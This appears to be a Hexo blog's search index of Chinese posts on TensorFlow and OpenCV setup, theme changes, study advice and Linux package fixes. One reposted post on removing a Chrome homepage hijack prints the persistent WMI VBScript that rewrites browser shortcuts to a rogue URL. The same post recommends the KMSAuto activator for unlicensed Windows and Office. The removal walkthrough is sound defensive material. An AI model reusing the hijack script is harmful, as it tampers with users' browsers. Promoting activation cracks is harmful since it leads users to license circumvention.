    <content type="text"><![CDATA[本文针对 Windows 10 下 TensorFlow 的安装提供一些经验（包含 CPU 版及 GPU 版）。 TensorFlow CPU 版本安装基本软件需求： Python 3.6.*：安装时记得勾选 “ADD TO PATH” 安装： 1pip install --user --upgrade tensorflow 验证： 1python -c "import tensorflow as tf; tf.enable_eager_execution(); print(tf.reduce_sum(tf.random_normal([1000, 1000])))" TensorFlow GPU 版本安装基本软件需求： Python 3.6.* ：安装时记得勾选 “ADD TO PATH” Visual Studio NVIDIA® GPU drivers ：CUDA 9.0 要求驱动版本为 384.x 或更高。 CUDA® Toolkit ：TensorFlow 支持 CUDA 9.0. CUPTI ：包含在 CUDA Toolkit 中。 cuDNN SDK ：(&gt;= 7.2) (可选) NCCL 2.2 ：用于多 GPU 支持（因为个人设备限制，本文不作介绍） (可选) TensorRT 4.0 ：在某些模型上改进延迟和吞吐量以进行推理（机翻，本文亦不作介绍） 因为 CUDA® Toolkit 中包含 GPU 驱动，因此省去 GPU 安装介绍。 Visual Studio 安装Visual Studio 安装 CUDA 安装CUDA 9.0 下载链接 下载完成，双击根据提示进行安装。 程序应该会自动添加仅环境变量。 cuDNN 安装cuDNN 下载链接 选择 “I Agree To the Terms of the cuDNN Software License Agreement” 选择 “Download cuDNN v7.5.0 (Feb 21, 2019), for CUDA 9.0” 点击 “cuDNN Library for Windows 10” ，下载 将下载好的文件解压缩到某一路径 将 */cuda/bin */cuda/include */cuda/lib/x64 三个文件夹添加到环境变量 tensorflow-gpu 安装安装： 因为直接安装的话默认会安装 tensorflow-gpu 1.13.* ，但是貌似兼容性会有问题，在使用时会出错，所以我们选择安装 1.12 版本。 1pip install --ignore-installed --upgrade tensorflow-gpu==1.12 验证： 1234import tensorflow as tfhello = tf.constant("hello tensorflow")with tf.Session() as sess: print(sess.run(hello)) 从运行结果中，也可以很明显的看出程序使用了 GPU 资源。 参考tensorflow install jvishnuvardhan’s Installing-TensorFlow-GPU-on-Windows-10-TF1.12 官方经过测试的配置 一些经验虽然现在 GPU 内存都很大了，但不少人难免还在使用相对落后的笔记本电脑（比如我），可能 GPU 内存只有 2G ，这就会造成很多因为配置产生的问题。一个简单的例子就是 在运行 mnist 数据集的测试集时，会因为需要的内存较大而在一些显卡上无法运行。可以参考 ResourceExhaustedError in CNN/MNIST example (with GPU) #136 和 MNIST batch test #6764 ，其中提到了这个问题，并提供了解决办法，但是官方并为采纳。 所以，各位是安装 CPU 版还是 GPU 版还需根据自己电脑配置来斟酌。 最后部分链接在中国大陆或某些运营商宽度下可能速度较慢或无法访问，请自备科学上网工具以方便下载。 如有问题，请在科学上网前提下在评论中说明/指正。]]></content>
      <categories>
        <category>TensorFlow</category>
      </categories>
      <tags>
        <tag>TensorFlow</tag>
        <tag>Windows10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[主题更换纪]]></title>
    <url>%2F2018%2F12%2F29%2F%E4%B8%BB%E9%A2%98%E6%9B%B4%E6%8D%A2%E7%BA%AA%2F</url>
    <content type="text"><![CDATA[原本使用的 Material Theme 这两日使用起来很不舒服，页面滚动起来竟然会有些掉帧。于是就想着换个主题用用。由于心水 NexT 已久，所以就着手更换了。 参考主题文档。 安装并启用 NexT下载主题12cd bolggit clone https://github.com/iissnan/hexo-theme-next themes/next 启用主题打开站点根目录下 _config.yml 配置文件，编辑： 1theme: next 此时网站语言可能是英文，因为旧的主题语言设置可能与此主题不同，所以设置： 1language: zh-Hans 接着就看一下我们的新主题： 123hexo cleanhexo generatehexo server 根据提示在浏览器打开 http://localhost:4000 即可见到新主题芳容。 但总感觉哪里有些不对劲，所以需要继续进行配置。 主题设置选择 Scheme打开主题目录下 _config.yml 配置文件，更改： 1scheme: Pisces 这个是双栏模式，个人比较喜欢，其他可以查看文首链接。 菜单menu 下有多项设置可选，看需求设置就好。 如需自定页面，还需按需添加翻译信息（文件位置 languages/{language}.yml） 以上设置完成差不多就可以 deploy 了，其他细节慢慢添加。]]></content>
      <categories>
        <category>闲杂</category>
      </categories>
      <tags>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装 opencv-contrib 做 SIFT 特征匹配(Python)]]></title>
    <url>%2F2018%2F06%2F05%2FUbuntu-%E4%B8%8B%E5%AE%89%E8%A3%85-opencv-contrib-%E5%81%9A-SIFT-%E7%89%B9%E5%BE%81%E5%8C%B9%E9%85%8D-Python%2F</url>
    <content type="text"><![CDATA[因为 SIFT 算法的授权问题，导致 OpenCV 有两个版本，即如需使用 SIFT 算法就必须要用 OpenCV-contrib ，但是 VS2017 里配置 OpenCV-contrib 比较繁琐，使用 Python 就会方便很多。 Windows 下也可使用此方法，步骤大都如下，仅更改了标题，其余未作变动。 本文所使用环境： Ubuntu 16.04 LTS / Windows Python 2.7 安装 opencv-contrib 先安装 pip 软件包管理系统 打开一个 Terminal (快捷键 ctrl + alt + t ) 输入以下命令后回车，按提示操作 sudo apt-get install python-pip 安装 OpenCV-contrib Terminal 中输入以下命令，等待提示完成即可 pip install opencv-contrib-python 验证 Terminal 中执行以下命令验证是否安装成功 $ python import cv2 as cv print(cv.__version__) 安装成功会输出当前版本号 SIFT 特征匹配 代码 #sift feature import cv2 import numpy as np MIN_MATCH_COUNT = 4 imgname1 = &quot;1.jpg&quot; imgname2 = &quot;2.jpg&quot; ## (1) prepare data img1 = cv2.imread(imgname1) img2 = cv2.imread(imgname2) gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY) gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY) ## (2) Create SIFT object sift = cv2.xfeatures2d.SIFT_create() ## (3) Create flann matcher matcher = cv2.FlannBasedMatcher(dict(algorithm = 1, trees = 5), {}) ## (4) Detect keypoints and compute keypointer descriptors kpts1, descs1 = sift.detectAndCompute(gray1,None) kpts2, descs2 = sift.detectAndCompute(gray2,None) ## (5) knnMatch to get Top2 matches = matcher.knnMatch(descs1, descs2, 2) # Sort by their distance. matches = sorted(matches, key = lambda x:x[0].distance) ## (6) Ratio test, to get good matches. good = [m1 for (m1, m2) in matches if m1.distance &amp;lt; 0.7 * m2.distance] canvas = img2.copy() ## (7) find homography matrix if len(good)&amp;gt;MIN_MATCH_COUNT: ## (queryIndex for the small object, trainIndex for the scene ) src_pts = np.float32([ kpts1[m.queryIdx].pt for m in good ]).reshape(-1,1,2) dst_pts = np.float32([ kpts2[m.trainIdx].pt for m in good ]).reshape(-1,1,2) ## find homography matrix in cv2.RANSAC using good match points M, mask = cv2.findHomography(src_pts, dst_pts, cv2.RANSAC,5.0) #matchesMask2 = mask.ravel().tolist() h,w = img1.shape[:2] pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2) dst = cv2.perspectiveTransform(pts,M) cv2.polylines(canvas,[np.int32(dst)],True,(0,255,0),3, cv2.LINE_AA) else: print( &quot;Not enough matches are found - {}/{}&quot;.format(len(good),MIN_MATCH_COUNT)) ## (8) drawMatches matched = cv2.drawMatches(img1,kpts1,canvas,kpts2,good,None)#,**draw_params) ## (9) Crop the matched region from scene h,w = img1.shape[:2] pts = np.float32([ [0,0],[0,h-1],[w-1,h-1],[w-1,0] ]).reshape(-1,1,2) dst = cv2.perspectiveTransform(pts,M) perspectiveM = cv2.getPerspectiveTransform(np.float32(dst),pts) found = cv2.warpPerspective(img2,perspectiveM,(w,h)) ## (10) save and display cv2.imwrite(&quot;matched.png&quot;, matched) cv2.imwrite(&quot;found.png&quot;, found) cv2.imshow(&quot;matched&quot;, matched); #cv2.imshow(&quot;found&quot;, found); cv2.waitKey();cv2.destroyAllWindows() 原始图像： 匹配结果：]]></content>
      <categories>
        <category>OpenCV</category>
      </categories>
      <tags>
        <tag>OpenCV</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenCV 在 Visual Studio 中的使用]]></title>
    <url>%2F2018%2F04%2F28%2FOpenCV-%E5%9C%A8-Visual-Studio-%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[本文介绍了 VS2017 中配置 OpenCV 的方法。 因为 nonfree 的算法问题，重写部分内容，文中图片暂不更换，文件名及路径以文字为准。 PS: 文中理论上没有错误的地方了=￣ω￣= 因为某些原因，阅读体验较差 本文内容： OpenCV 的安装 Visual Studio 的安装 VS 中配置 OpenCV 所需环境及文件（仅供参考）： Windows 10 64 bit opencv-2.4.13.6-vc14.exe Visual Studio 2017 推荐使用 OpenCV-2.* 是因为可以更方便使用如 SIFT 等 nonfree 算法 OpenCV 的安装 下载在 OpenCV 的 GitHub 的 Releases 页面下载 opencv-2.4.13.6-vc14.exe 文件 （OpenCV 此页面也可下载到） 安装上述下载的文件为自解压文件，双击后选择要解压的目录即可（本文直接解压到 C 盘，后续用到的路径根据自己解压的路径自行替换） 添加环境变量右键此电脑 –&gt; 属性 –&gt; 高级系统设置 –&gt; 环境变量编辑系统变量的 Path 变量，添加 C:\opencv\build\x64\vc14\bin 此路径 Visual Studio 的安装 下载进入官方下载页面下载 Visual Studio Community 2017 版本 （确保你有微软账号，软件需要登陆，不登陆可能会有使用时间限制） 安装打开刚下载的软件，等待些许时间会进入 Visual Studio Installer , 选择 Visual Studio Community 2017 安装，接下来我们选择要安装的环境（本文选择 c++ ）如下图 (此处需要注意，C 盘务必保留充足空间，即使更换了安装位置还是要占用 C 盘部分空间) 接下来等待安装程序自动下载安装，时间长短依赖个人网速及电脑性能 VS 中配置 OpenCV大致需要三个步骤： 编译器添加 include 路径 编译器添加 lib 路径 编译器添加 lib 文件 新建一个空/控制台项目 添加一个源文件 配置 OpenCV 并运行测试代码 配置 红框处按图片上设置然后在新建的项目上右键然后选择属性 添加 C:\opencv\build\include 路径，注意红框处 添加 C:\opencv\build\x64\vc14\lib 路径 添加 opencv_ml2413d.libopencv_calib3d2413d.libopencv_contrib2413d.libopencv_core2413d.libopencv_features2d2413d.libopencv_flann2413d.libopencv_gpu2413d.libopencv_highgui2413d.libopencv_imgproc2413d.libopencv_legacy2413d.libopencv_objdetect2413d.libopencv_ts2413d.libopencv_video2413d.libopencv_nonfree2413d.libopencv_ocl2413d.libopencv_photo2413d.libopencv_stitching2413d.libopencv_superres2413d.libopencv_videostab2413d.lib这些库文件，Release mod 删除后缀前的 d 即可，其他版本根据具体版本修改每个文件中的数字（即版本号） 测试代码 将代码 copy 到刚刚新建的源文件并保存 /********************************************************** Name : Date : 2016/05/29 By : CharlotteHonG Final: 2016/05/29 **********************************************************/ #include &amp;lt;iostream&amp;gt; #include &amp;lt;opencv2/opencv.hpp&amp;gt; using namespace cv; int main(int argc, char const *argv[]) { /* 畫布 */ Mat img(270, 720, CV_8UC3, Scalar(56, 50, 38)); /* 直線 */ line(img, Point(20, 40), Point(120, 140), Scalar(255, 0, 0), 3); /* 實心方塊 */ rectangle(img, Point(150, 40), Point(250, 140), Scalar(0, 0, 255), -1); /* 實心圓 */ circle(img, Point(330, 90), 50, Scalar(0, 255, 0), -1); /* 空心橢圓 */ ellipse(img, Point(460, 90), Size(60, 40), 45, 0, 360, Scalar(255, 255, 0), 2); /* 不規則圖形 */ Point points[1][5]; int x = 40, y = 540; points[0][0] = Point(0 + y, 50 + x); points[0][1] = Point(40 + y, 0 + x); points[0][2] = Point(110 + y, 35 + x); points[0][3] = Point(74 + y, 76 + x); points[0][4] = Point(28 + y, 96 + x); const Point* ppt[1] = { points[0] }; int npt[] = { 5 }; polylines(img, ppt, npt, 1, 1, Scalar(0, 255, 255), 3); /* 繪出文字 */ putText(img, &quot;Test Passed !!&quot;, Point(10, 230), 0, 3, Scalar(255, 170, 130), 3); /* 開啟畫布 */ namedWindow(&quot;OpenCV Test By:Charlotte.HonG&quot;, WINDOW_AUTOSIZE); imshow(&quot;OpenCV Test By:Charlotte.HonG&quot;, img); waitKey(0); return 0; } 一切准备好了，现在，直接按 F5 运行即可。不出意外，你会看到下图，如果出现问题，请检查以上步骤。 关于 SIFT 算法的程序问题，新建项目时推荐新建 Windows控制台应用程序 ，网上的程序可能会因为配置的 OpenCV 的路径不同，无法在你的电脑上运行（即找不到头文件），所以如果你使用本文的方法配置环境，对于 OpenCV 的扩展头文件应使用如下形式： #include &quot;opencv2/highgui/highgui.hpp&quot; ps: 此方法在每次新建项目后都要重新配置，貌似是 vs2017 无法全局配置，可以尝试将配置导出，以后直接导入配置，应该会方便些，具体方法这里就不说了（或者其他的配置方式）。 本文部分内容及代码借鉴自此博主 Charlotte.HonG 的文章 [圖文] OpenCV 3.4.1 安裝配置在 Visual Studio 2017 （感谢 Charlotte.HonG ^_^）]]></content>
      <categories>
        <category>OpenCV</category>
      </categories>
      <tags>
        <tag>OpenCV</tag>
        <tag>VS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome主页被篡改后如何解决？(部分内容转载)]]></title>
    <url>%2F2018%2F01%2F22%2FChrome%E4%B8%BB%E9%A1%B5%E8%A2%AB%E7%AF%A1%E6%94%B9%E5%90%8E%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[不少朋友可能都遇到过浏览器的主页被恶意篡改成某些令人作呕的国产网页，具体哪些网站，我想必也不必多说，大家也都心知肚明。 篡改浏览器的主页有很多种途径，最常见的就是直接去修改应用程序的快捷方式的 Command line ，强制在默认代码后加入将被导向的流氓网址。用这种方法可以说是挺直接的，我们也最容易发现问题所在。下面转载一篇今天发现并用到的一篇文章，希望能够给您带来一些帮助。 以下为原文： 最近重装了一次电脑。尽管什么百度系的软件我都没有下载，Chrome浏览器的主页还是被硬生生劫持了。每次点开后的主页是http://hao.qquu8.com这个链接，紧接着它会跳向hao123。电脑上原装的其他浏览器（IE和Edge）也是这样，弄得每次打开浏览器就被恶心一下，很是恼火。 我们先来看看问题在哪。右键快捷方式查看属性： 哦，原来快捷方式被改了，后面加了一段url。把它删了试试？还是不行，几分钟后还是被改回来了。我在很多平台上找了解决办法。有的试了没有效果，重新开机后还是一样的毛病，有的推荐装“管家”，但这种以毒攻毒的办法无异于饮鸩止渴。最后终于有一种靠谱的方法，经过实验和一点修改，完美解决！主页被劫持的原理是一段通过WMI发起的定时自动运行脚本，WMI（Windows Management Instrumentation）可以理解成Windows系统后台运行的一个事件管理器。为查看WMI事件，先去下载WMITools并安装：WMI工具。之后打开WMI Event Viewer： 点击左上角的笔的图标（Register For Events），在弹出的Connect to namespace的框直接点OK，Login的页面也直接点OK。点开左侧栏的EventFilter，再点击下级目录的项目： 在右侧栏右键点击ActiveScriptEventConsumer，并通过view instant properties查看属性： 在Script Text那一栏我们可以看到这段脚本：On Error Resume Next Const link = “http://hao.qquu8.com/?m=yx&amp;amp;r=j“Const link360 = “http://hao.qquu8.com/?m=yx&amp;amp;r=j&amp;amp;s=3“browsers = “114ie.exe,115chrome.exe,1616browser.exe,2345chrome.exe,2345explorer.exe,360se.exe,360chrome.exe,,avant.exe,baidubrowser.exe,chgreenbrowser.exe,chrome.exe,firefox.exe,greenbrowser.exe,iexplore.exe,juzi.exe,kbrowser.exe,launcher.exe,liebao.exe,maxthon.exe,niuniubrowser.exe,qqbrowser.exe,sogouexplorer.exe,srie.exe,tango3.exe,theworld.exe,tiantian.exe,twchrome.exe,ucbrowser.exe,webgamegt.exe,xbrowser.exe,xttbrowser.exe,yidian.exe,yyexplorer.exe”lnkpaths = “C:\Users\Public\Desktop,C:\ProgramData\Microsoft\Windows\Start Menu\Programs,C:\Users\sjtul\Desktop,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu,C:\Users\sjtul\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar,C:\Users\sjtul\AppData\Roaming\Microsoft\Windows\Start Menu\Programs”browsersArr = split(browsers,”,”)Set oDic = CreateObject(“scripting.dictionary”)For Each browser In browsersArr​ oDic.Add LCase(browser), browserNextlnkpathsArr = split(lnkpaths,”,”)Set oFolders = CreateObject(“scripting.dictionary”)For Each lnkpath In lnkpathsArr​ oFolders.Add lnkpath, lnkpathNextSet fso = CreateObject(“Scripting.Filesystemobject”)Set WshShell = CreateObject(“Wscript.Shell”)For Each oFolder In oFolders​ If fso.FolderExists(oFolder) Then​ For Each file In fso.GetFolder(oFolder).Files​ If LCase(fso.GetExtensionName(file.Path)) = “lnk” Then​ Set oShellLink = WshShell.CreateShortcut(file.Path)​ path = oShellLink.TargetPath​ name = fso.GetBaseName(path) &amp; “.” &amp; fso.GetExtensionName(path)​ If oDic.Exists(LCase(name)) Then​ If LCase(name) = LCase(“360se.exe”) Then​ oDicShellLink.Arguments = link360​ Else​ oShellLink.Arguments = link​ End If​ If file.Attributes And 1 Then​ fsoile.Attributes = file.Attributes - 1​ End If​ oShellLink.Save​ End If​ End If​ Next​ End IfNext终于抓到了幕后黑手。可以看到这是一段VBScript代码，攻击目标涵盖了包括Chrome、360、Firefox、搜狗等30余种常见的浏览器。脚本以浏览器的安装地址为切入点，创建WshShell对象，进而生成植入了流氓网站的快捷方式。360浏览器有限定主页格式，于是这段脚本还特地修饰了流氓网站的链接。唉，流氓至此，也是服了。查到了源头如何清清除这段造孽的脚本呢？直接在WMI Event Viewer中将_EventFilter.Name=”VBScriptKids_filter”右键删掉会被系统拒绝掉，需要去WMI Event Viewer的安装位置，右键以管理员方式运行exe文件才能删掉。之后还要把各个快捷方式都改回不带流氓网站的版本，包括桌面上的、开始菜单里的以及快速访问栏里的快捷方式，其中开始菜单里的快捷方式要去C:\ProgramData\Microsoft\Windows\Start Menu\Programs里改掉。唉，一趟下来真是让人心累，好在最终浏览器摆脱了流氓网站的劫持： 当然在这时候，你可以点击之前下载的WMI安装包，把WMI系列工具卸载掉。最后提一下电脑中毒的原因。我分析是前几天用了小马激活这个工具来激活Windows系统，当时并没有激活成功反而还引来了病毒。推荐一款俄罗斯人开发的工具，可以成功激活Windows系统和Office软件，也不会招来一些流氓脚本：KMSAuto详见抢救被流氓网站劫持的浏览器主页 注： 转载自知乎 原作者： 七个太阳 原文链接： 为什么 Chrome 浏览器的主页会被篡改为 hao123 ？遇到这种情况要如何修复？ 七个太阳的回答 转载以经作者授权，如需二次转载，请务必联系原作者，在此感谢原作者的文章及授权。]]></content>
      <categories>
        <category>Tips</category>
      </categories>
      <tags>
        <tag>chrome</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[给大学生的几条良心建议（转载）]]></title>
    <url>%2F2017%2F05%2F19%2F%E7%BB%99%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%9A%84%E5%87%A0%E6%9D%A1%E8%89%AF%E5%BF%83%E5%BB%BA%E8%AE%AE%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89%2F</url>
    <content type="text"><![CDATA[原文：by:stormzhang这篇文章是我写给小密圈中 20% 比例的大学生的，但是考虑到我公众号的读者中也有不少也是大学生或者研究生，所以姑且分享出来，希望对更多的还在校园的同学有所帮助与思考，更希望能够消除你们对未来的迷茫与恐慌。 绝大部分的大学教育都是渣 可能有人觉得话说的有点难听，但是事实就是如此，这不是大学的问题，本质上是中国教育的问题，中国的教育一向都是「灌输式」教学，成绩差跟成绩好的同学唯一的区别就是，成绩好的会很努力的去记那些理论性的东西，会非常在意自己的分数与奖项，成绩差的同学则比较懒，但不是笨，甚至很多人比成绩好的同学要聪明，但是本质上，他们都清一色的不知道自己所学的那些东西到底有什么用？这个才是最可悲的地方。 所以，如果你在学校的成绩比较好，那么别骄傲，你只不过会是在毕业后的应聘简历上多一条「大学奖学金获得者」而已，其他没什么特别大的优势，成绩差的也别灰心，你只是比较懒，不愿让自己的付出回报不成正比而已。那些学校好的与学校差的同学，也只是在学历上的一点优势而已，中国绝大部分的学校教育都缺乏讨论、缺乏思考、缺乏实践。 当然，名校肯定比一般的学校要好，这个毋庸置疑，而且平均水平肯定是名校比一般学校出来的人才更多，但是也只是平均而已，我跟比尔盖茨平均起来，我也是亿万富翁了，根本还是取决于个人。 你现在的专业跟你以后的工作可能没什么关系 很多毕业生毕业总是奢求能找到一份专业对口的工作，我告诉你，这很难，本质上也是因为中国的教育造成的，前面说到，你在学校学到的东西根本不知道以后干嘛用的。 拿计算机专业的举例，正是因为计算机专业的同学大学学了一堆什么计算机网络、操作系统，C 语言、数据结构等等，都是最最枯燥、最最乏味的课程，你学了四年，你从来不知道这些东西能做什么用？导致很多计算机专业的同学对自己的课程很厌恶，甚至到了抵触的心理，这也直接造成很多计算机专业的同学毕业后有很多去做了销售，等你工作后才发现，反而工作中从事编程行业的，却很多不是计算机专业的，有很多都是其他理科类专业的同学，而且这部分人大部分是因为毕业后工作接触到了编程，对此产生兴趣，知道这个能赚钱，所以发奋自学，从而走上了这一行。 所以，不管你是什么专业的，如果对本专业感兴趣，那还好，毕业之后尽量去找个专业相关的工作，如果对本专业不感兴趣，想从事别的行业，别担心，只要你感兴趣，肯用心去学习，那么一定不是问题，有时候甚至比那些科班生出身更有优势，因为这个职业是你自己出于兴趣以及回报而选择的，没有任何人逼你，你会更有动力去学习。 「学习能力」是大学四年学到的最重要技能 前面虽然把大学说的一无是处，有人会问，那干脆别读大学好了，这当然是不行的。虽然中国的大学教育有它各种各样的问题，但是这个时代，首先大学文凭是一个硬性规定，没有大学学历，你是很难在社会上立足的，起点会非常难。其次，大学跟高中的形式有着本质的区别，高中的教育是家长和老师的驱动下，面对种种压力你不得不去学习，所以高中的学习是压力下不得不去做的事。 但是大学可就不一样了，没人看着你，没人会关注到你，你有更多的自由与选择空间，玩什么，结实什么样的人，去不去上课都完全取决于你，我相信绝大部分大学生的考试复习大都集中在考试前的最后两周，这种学习完全是自我驱动的，所以，大学还是非常有必要上的，而且每个人最主要的区别可能就体现在了「学习能力」上，因为你会发现，大家都是上着同样的课，甚至有的人根本不去听课，但是同样是最后两周的自学冲刺，有的人就能轻松考过，或者考了很高的分数，有的人却学了很久依然考的不理想，这就是学习能力的差异。 即使是玩游戏，同样的时间，有的人玩的很好，会分析怎么出装更合理，团队战术怎么更容易取胜，有的人，却是一直沉迷于游戏，自制力很弱，而且还很有可能玩的不行。 所以，自制力很好，学习能力很不错的人，会在以后的职场有更多、更好的选择，而且也容易有更好的发展，即使这个人在大学喜欢玩游戏，即使在大学成绩很一般。 多动手，多实习 前面说了，大学学的都是一些理论性的东西，你根本不知道那些东西能干嘛，但是如果你能尽早去实习，尽早去参与实践，那你会有别样的体会。 举个例子，当计算机专业的同学都不知道所学的理论能干嘛的时候，你就去一家企业实习了，即使平时的工作只是打杂，但是你能真正认识了实际工作中是怎样的，别人在工作的时候用到了什么技能，看到别人拿到的高薪，你会发现原来，你所学的那些东西这么值钱，你会更有动力去学习，而且很有针对性的去学习，你得相信，理论与实践相结合，比那些只会闷头读书的人要有用的多，你想要的不是只在学校里空虚的考试分数而已，你更想要的是未来用自己的技能换取财富的能力！ 这些事情你该在大学就做了 我以一个过来人的经验，真心建议你们，大学这些事必须要做了，甚至比拿什么奖学金，考什么证还要重要。 多运动，坚持运动，有个好的身体比什么都重要。 多阅读，坚持阅读，哪怕跟你的专业无关的书籍。 考个驾照，一定要考，这个是 100% 所有工作之后的人最后悔的一件事，是的，就是 100%。 如果可以的话，谈场恋爱吧，哪怕最后以失败告终。 PS：以上就是我过来人的经验之谈，希望可以对更多的人有帮助，觉得有用，可以随手转发，谢谢。]]></content>
      <categories>
        <category>转载</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Google I/O 17]]></title>
    <url>%2F2017%2F05%2F10%2FGoogle-I-O-17-1%2F</url>
    <content type="text"><![CDATA[Google I/O is an annual developer festival held at the outdoor Shoreline Amphitheatre.May 17-19, 2017Shoreline Amphitheatre Mountain View, California ​ 官方网站：Google I/O17]]></content>
      <tags>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修复Ubuntu17.04无法安装网易云音乐问题（转载）]]></title>
    <url>%2F2017%2F04%2F17%2F%E4%BF%AE%E5%A4%8DUbuntu17.04%E6%97%A0%E6%B3%95%E5%AE%89%E8%A3%85%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[装了Ubuntu17.04的用户会出现这一问题，原因是libqt5libqgtk2的依赖问题，这里需要将其替换为qt5-style-plugins. 教程如下（以下内容来自互联网）： 1.下载deb包，备用 网易云音乐 2.安装一些编译时需要的程序 sudo apt-get install build-essential debhelper make autoconf automake dpkg-dev fakeroot pbuilder gnupg 3.解包 建立目录sudo mkdir -p netease/DEBIAN sudo mkdir fix 解包sudo dpkg -x netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb ./netease 解出控制文件sudo dpkg -e netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb netease/DEBIAN/ 修改控制文件sudo gedit netease/DEBIAN/control 找到 libqt5libqgtk2 ，替换为 qt5-style-plugins ，保存，退出。 4.重新打包 sudo dpkg-deb -b netease/fix/ 5.安装 sudo dpkg -i netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb 6.至此，理论上不会出错。 （如若报错尝试命令sudo apt-get install -f） PS:修改过的包 网易云音乐fixed 密钥：!aTE_wj3jalmc7Gu5rxhgM3WpLtGzv6ymBrbgJCpDEIg]]></content>
      <categories>
        <category>Tips</category>
      </categories>
      <tags>
        <tag>网易云音乐</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2017%2F02%2F17%2FHello-World%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>HelloWorld</category>
      </categories>
  </entry>
</search>
